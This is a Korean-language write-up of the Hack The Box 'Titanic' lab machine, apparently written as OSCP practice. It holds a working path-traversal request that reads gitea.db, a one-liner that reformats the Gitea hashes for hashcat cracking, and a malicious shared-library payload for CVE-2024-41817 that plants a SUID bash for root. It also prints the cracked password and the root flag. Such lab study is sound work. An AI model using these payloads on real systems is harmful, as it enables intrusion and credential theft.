---
slug: "titanic"
title: "titanic"
date: 2026-08-01
category: "리눅스"
section: "OSCP"
tags: []
excerpt: "gobuster dir -u http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt ``` 근데…"
readingTime: 9
---

#### Box: titanic | Linux | Easy
날짜: 2026 07 31
소요시간 : 

##### Open Ports
22
80
##### Interesting Services
80포트에 titanic.htb가 있어서 /etc/hosts에 등록해주고 gobuster실행
```sh
echo "10.129.231.221 titanic.htb" | sudo tee -a /etc/hosts
 
gobuster dir -u http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
근데 여기에 너무 내용이 없어서 vhost스캔
```sh
gobuster vhost -u http://titanic.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -xs 301
> dev.titanic.htb

echo "10.129.231.221 dev.titanic.htb" | sudo tee -a /etc/hosts
```
-> 리다이렉션이 너무 많이나와서 -xs 옵션으로 제외 시켜준 후 실행 후 /`etc/host`에 등록

```sh
gobuster dir -u http://dev.titanic.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
![](assets/images/posts/Pasted%20image%2020260801232533.png)

##### Initial Foothold
벡터: `/download?ticket=` 파라미터가 os.path.join에 그대로 들어가는 path traversal로 gitea.db 탈취 → 해시 크랙 → SSH

명령어:

우선 저 `developer`에 들어가보도록 하자
![](assets/images/posts/Pasted%20image%2020260801232718.png)
처음 나왔던 `titanic.htb`의 것으로 보이는 코드가 있음

아래는 app.py라는 코드의 일부인데 여길 주의 깊게 봐야함
```python
TICKETS_DIR = "tickets"

@app.route('/download', methods=['GET'])
def download_ticket():
	ticket = request.args.get('ticket')
	if not ticket:
		return jsonify({"error": "Ticket parameter is required"}), 400
	
	json_filepath = os.path.join(TICKETS_DIR, ticket)
	
	if os.path.exists(json_filepath):
		return send_file(json_filepath, as_attachment=True, download_name=ticket)
	else:
		return jsonify({"error": "Ticket not found"}), 404
```
-> 보면 get 방식으로 ticket이 arg를 받는 걸 볼 수 있음 => 그럼 이 티켓 파라미터를 이용해서 내가 원하는 파일을 읽을 수 있지 않을까?

![](assets/images/posts/Pasted%20image%2020260801233519.png)
=> 성공!
그치만 우린 해당 유저에 들어갈 수 있는 뭔가가 필요함
![](assets/images/posts/Pasted%20image%2020260801233723.png)
gitea에 또 다른 곳에는 이런게 있음 해당 디렉토리의 구조를 알려주는 약간의 힌트인듯 함.

[`docs.gitea.com`](https://docs.gitea.com/installation/install-with-docker/)에 들어가보면 이런 cheatsheet이 있음
![](assets/images/posts/Pasted%20image%2020260801234624.png)
![](assets/images/posts/Pasted%20image%2020260801234702.png)
![](assets/images/posts/Pasted%20image%2020260801234735.png)

-> gitea.db를 열어서 sqlite로 까보면 뭔가 있지 않을까?
```sh
http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db
```
![](assets/images/posts/Pasted%20image%2020260801235538.png)
->pbkdf2로 암호화된 해시 함수가 rand값, salt값이 다 나온 상태로 있음
-> `pbkdf2$50000$50` : pbkdf2 방식을 5만번 실행해 50바이트의 문자열을 만들었다는거라고 함

```sh
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64) salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64) name=$(echo "$data" | cut -d'|' -f3) echo "${name}:sha256:50000:${salt}:${digest}" done | tee gitea.hashes
```
-> 이제부터 gitea 나오면 이거 애용하도록 해
```sh
hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --user

#얜 크랙된거 보는 용도 (다른 터미널)
hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --user --show

> developer:25282528
```

```sh
ssh developer@titanic.htb
> pw: 25282528
```
![](assets/images/posts/Pasted%20image%2020260802010420.png)
##### Privilege Escalation
벡터: root cron이 실행하는 magick의 작업 디렉토리에 쓰기 권한 있어서 malicious .so 심어 코드 실행 → SUID bash로 root

명령어:
[[linux_privesc]] 여기 있는 모든 기초 메뉴얼 다 해봤는데 안돼서 최후의 수단인 디렉토리 전체 탐색 ㄱㄱ
![](assets/images/posts/Pasted%20image%2020260802010856.png)
-> 뒤지다 보니 이상한 쉘 스크립트를 찾음 date를 찍어보니 바뀐지 얼마 안된 파일이 하나 있음 

`magick`에 대한 정보 수집
![](assets/images/posts/Pasted%20image%2020260802011238.png)
[CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)가 있다고 함

Arbitrary Code Execution을 재현해보자
```sh
#쓰기 권한 있는 디렉토리로 이동
cd /tmp

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```
![](assets/images/posts/Pasted%20image%2020260802012755.png)

약간의 코드 변형으로 /bin/bash 를 복사해옴
```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/kb; chmod 6777 /tmp/kb");
    exit(0);
}
EOF
```
![](assets/images/posts/Pasted%20image%2020260802015308.png)
![](assets/images/posts/Pasted%20image%2020260802015346.png)
->**root.txt :** c8d1172af2cb07bf741538949014d973
##### Rabbit Hole (막혔던 것)
- 잘못된 서칭 (gitea의 CVE를 검색함)
- hashcat 사용법
- ACE 변형하기
##### 다음 박스에서 써먹을 것
- gitea 나오면 db 위치 찾기
- hashcat 사용법 
- ACE 변형
- 전혀 권한 상승할 길이 없어 보일 땐 최종 보류한 전체파일 훑기 (의심가는 파일 찾기)
